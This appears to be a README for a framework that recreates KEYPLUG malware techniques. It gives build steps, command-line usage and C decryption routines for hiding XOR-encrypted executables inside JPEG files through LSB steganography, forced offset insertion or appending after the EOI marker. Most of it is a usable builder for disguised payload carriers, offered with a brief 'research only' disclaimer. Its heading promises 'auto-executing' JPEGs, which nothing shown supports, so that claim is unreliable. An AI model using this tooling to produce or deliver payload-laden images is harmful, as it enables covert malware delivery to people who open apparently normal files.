# KEYPLUG Malware Recreation Framework

## Overview

This framework provides a simplified implementation of the techniques found in the KEYPLUG malware samples. It accurately recreates the encryption algorithms, steganography methods, and payload execution mechanisms used in the original malware.

**WARNING:** This code is provided for research purposes only. Creating malicious files is illegal and unethical unless done in a controlled security research environment.

## Key Features

1. **Encryption Algorithms**
   - Single-byte XOR (Sample 1: key 0x20)
   - Multi-layered decryption (Sample 2: 9e+d3+b63c1e94+a2800a28)
   - Offset XOR decryption (Sample 3: 0xff00 at offset 18313)
   - Pattern-key based decryption

2. **Steganography Techniques**
   - LSB steganography in JPEG data
   - Forced payload insertion at specific offset (33849)
   - Appending data after JPEG EOI marker

3. **Analysis Tools**
   - Payload extraction from malicious JPEGs
   - Encryption detection and analysis
   - Payload verification

## Compilation

To build the framework:

```bash
cd keyplug_simplified
make
```

This will create the `keyplug` executable which provides all functionality.

## Usage Instructions

### Creating Malicious JPEG Files

To create a JPEG with an embedded payload:

```bash
./keyplug create --source clean.jpg --output malicious.jpg --payload your_payload.exe --encrypt 4 --method 3
```

Parameters:
- `--source`: Source (clean) JPEG file
- `--output`: Output (malicious) JPEG file
- `--payload`: Executable file to embed
- `--encrypt`: Encryption type
  - `0`: No encryption
  - `1`: Single-byte XOR (Sample 1: key 0x20)
  - `2`: Offset XOR (Sample 3: 0xff00 at offset 18313)
  - `3`: Pattern key (a2800a28)
  - `4`: Multi-layer (Sample 2: 9e+d3+b63c1e94+a2800a28)
- `--method`: Embedding method
  - `1`: LSB steganography
  - `2`: Forced payload at offset 33849
  - `3`: Append after EOI marker

### Extracting Payloads from JPEG Files

To extract a payload from a malicious JPEG:

```bash
./keyplug extract --input malicious.jpg --output extracted_payload.bin
```

### Analyzing JPEG Files for Hidden Payloads

To analyze a JPEG file for hidden payloads:

```bash
./keyplug analyze --input suspicious.jpg
```

## Step-by-Step: Creating Auto-Executing JPEG Files

For research purposes, here's how to create an auto-executing JPEG that recreates the techniques used by the KEYPLUG malware:

### 1. Prepare Your Payload

First, create a simple executable payload for testing:

```c
// payload.c
#include <stdio.h>

int main() {
    printf("KEYPLUG Malware Simulation Executed\n");
    return 0;
}
```

Compile it:
```bash
gcc -o payload.exe payload.c
```

### 2. Prepare a Clean JPEG

Obtain a legitimate JPEG file to serve as the carrier. You can use any JPEG image.

### 3. Create the Malicious JPEG

Using the techniques from Sample 3 (considered the most effective):

```bash
./keyplug create --source clean.jpg --output malicious.jpg --payload payload.exe --encrypt 2 --method 2
```

This will:
1. Take your payload (`payload.exe`)
2. Encrypt it using the Sample 3 technique (0xff00 XOR at offset 18313)
3. Embed it in the JPEG using the forced insertion technique
4. Create a new file (`malicious.jpg`) that appears to be a normal image

### 4. Test the Extraction

Verify the payload can be properly extracted:

```bash
./keyplug extract --input malicious.jpg --output extracted.bin
```

### 5. Advanced: Multi-Layer Encryption (Sample 2 Technique)

For a more complex implementation similar to Sample 2:

```bash
./keyplug create --source clean.jpg --output complex.jpg --payload payload.exe --encrypt 4 --method 1
```

This uses:
1. Multi-layered encryption (9e+d3+b63c1e94+a2800a28)
2. LSB steganography for hiding the payload

## Implementation Details

The framework accurately implements the key algorithms found in the malware samples:

1. **Sample 1 Decryption (XOR key 0x20)**
   ```c
   void keyplug_decrypt_xor(uint8_t* data, size_t data_len, uint8_t key) {
       for (size_t i = 0; i < data_len; i++) {
           data[i] ^= key;
       }
   }
   ```

2. **Sample 2 Multi-Layer Decryption (9e+d3+b63c1e94+a2800a28)**
   ```c
   void keyplug_decrypt_sample2(uint8_t* data, size_t data_len) {
       // Layer 1: XOR with 0x9e
       keyplug_decrypt_xor(data, data_len, 0x9e);
       
       // Layer 2: XOR with 0xd3
       keyplug_decrypt_xor(data, data_len, 0xd3);
       
       // Layer 3: Pattern key 0xb63c1e94
       keyplug_decrypt_pattern_key(data, data_len, 0xb63c1e94);
       
       // Layer 4: Position-dependent XOR with a2800a28
       uint8_t pattern_key[] = {0xa2, 0x80, 0x0a, 0x28};
       keyplug_decrypt_position_xor(data, data_len, pattern_key, sizeof(pattern_key));
   }
   ```

3. **Sample 3 Decryption (0xff00 at offset 18313)**
   ```c
   void keyplug_decrypt_sample3(uint8_t* data, size_t data_len) {
       // Layer 1: Apply 0xff00 XOR key starting at offset 18313
       keyplug_decrypt_offset_xor(data, data_len, 0xff00, 18313);
       
       // Layer 2: Apply pattern key a2800a28
       keyplug_decrypt_pattern_key(data, data_len, 0xa2800a28);
   }
   ```

## Security Considerations

This framework recreates malware techniques for research purposes. When using it:

1. Work in an isolated environment
2. Do not distribute created files
3. Use only for educational purposes
4. Be aware of legal implications
5. Ensure proper authorization before testing

## References

Based on the analysis of KEYPLUG malware samples extracted from the NDA.odg document:
- Sample 1: XOR key 0x20
- Sample 2: Multi-layered encryption (9e+d3+b63c1e94+a2800a28)
- Sample 3: XOR key 0xff00 at offset 18313
